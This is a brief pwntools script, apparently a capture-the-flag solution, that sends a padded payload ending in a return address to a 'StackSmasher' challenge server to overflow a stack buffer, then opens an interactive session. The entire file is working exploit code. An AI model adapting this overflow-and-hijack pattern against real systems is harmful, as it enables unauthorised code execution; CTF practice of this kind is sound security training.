#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1405'

p = remote(HOST, PORT)

p.sendlineafter(b'Hola StackSmasher : ', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka\xd6\x91\x04\x08')

p.interactive()